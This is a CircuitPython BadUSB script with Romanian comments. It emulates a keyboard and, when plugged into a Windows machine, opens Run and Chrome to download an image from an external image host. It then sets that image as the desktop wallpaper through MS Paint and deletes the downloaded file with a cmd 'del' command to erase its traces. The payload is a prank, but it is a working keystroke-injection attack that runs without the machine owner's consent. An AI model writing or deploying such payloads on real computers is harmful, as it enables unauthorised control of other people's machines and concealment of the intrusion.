"""G.B. pa sistem"""
import time

# import board
# import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

time.sleep(1)  # Sleep for a bit to avoid a race condition on some systems
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

delay       = 2
delayStroke = 0.001
delayWrite  = 0.001
delayAlt    = 1
delayCompensatorNetProst = 3

file_path = r"%userprofile%\downloads\mareSefDeSef.jpg"
# link = 'https://img.youtube.com/vi/rG49F1WNaTw/hqdefault.jpg'
link = "https://i.postimg.cc/Ssg3YDQt/hqdefault.jpg"

# ca sa nu-l grabim
time.sleep(5)

# windows fuga
keyboard.press(Keycode.GUI, Keycode.R)
time.sleep(delayStroke)
keyboard.release(Keycode.GUI, Keycode.R)
time.sleep(delay)

# pescuieste poza
keyboard_layout.write("chrome.exe ", delayWrite)
keyboard_layout.write(link, delayWrite)
keyboard_layout.write("\n")
time.sleep(delayCompensatorNetProst)
keyboard.press(Keycode.CONTROL, Keycode.S)
time.sleep(delayStroke)
keyboard.release(Keycode.CONTROL, Keycode.S)
time.sleep(delay)
keyboard_layout.write(file_path, delayWrite)
keyboard_layout.write("\n")
time.sleep(delay)

# inchide tab
keyboard.press(Keycode.CONTROL, Keycode.W)
time.sleep(delayStroke)
keyboard.release(Keycode.CONTROL, Keycode.W)
time.sleep(delay)

# windows fuga
keyboard.press(Keycode.GUI, Keycode.R)
time.sleep(delayStroke)
keyboard.release(Keycode.GUI, Keycode.R)
time.sleep(delay)

# baga poza pe vopsea
keyboard_layout.write("mspaint\n", delayWrite)
time.sleep(delay)
keyboard.press(Keycode.CONTROL, Keycode.O)
time.sleep(delayStroke)
keyboard.release(Keycode.CONTROL, Keycode.O)
time.sleep(delay)
keyboard_layout.write(file_path, delayWrite)
keyboard_layout.write("\n")
time.sleep(delay)

# pune-o tapet
keyboard.press(Keycode.ALT)
time.sleep(delayStroke)
keyboard.release(Keycode.ALT)
time.sleep(delayAlt)
keyboard.press(Keycode.F)
time.sleep(delayStroke)
keyboard.release(Keycode.F)
time.sleep(delayAlt)
keyboard.press(Keycode.B)
time.sleep(delayStroke)
keyboard.release(Keycode.B)
time.sleep(delay)
keyboard_layout.write("\n")
time.sleep(delay)

# inchide vopsea
keyboard.press(Keycode.ALT, Keycode.F4)
time.sleep(delayStroke)
keyboard.release(Keycode.ALT, Keycode.F4)
time.sleep(delayStroke)
keyboard.press(Keycode.TAB)
time.sleep(delayStroke)
keyboard.release(Keycode.TAB)
time.sleep(delayStroke)
keyboard_layout.write("\n")
time.sleep(delay)

# windows fuga
keyboard.press(Keycode.GUI, Keycode.R)
time.sleep(delayStroke)
keyboard.release(Keycode.GUI, Keycode.R)
time.sleep(delay)

# sterge urma
keyboard_layout.write("cmd\n", delayWrite)
time.sleep(delay)
keyboard_layout.write("cd ", delayWrite)
keyboard_layout.write(r"%userprofile%\downloads", delayWrite)
keyboard_layout.write("\n", delayWrite)
time.sleep(delay)
keyboard_layout.write("del mareSefDeSef.jpg\n", delayWrite)

# inchide cemede
keyboard.press(Keycode.ALT, Keycode.F4)
time.sleep(delayStroke)
keyboard.release(Keycode.ALT, Keycode.F4)
time.sleep(delay)

# arata savarsirea
keyboard.press(Keycode.GUI, Keycode.D)
time.sleep(delayStroke)
keyboard.release(Keycode.GUI, Keycode.D)
time.sleep(delay)

keyboard.release_all()
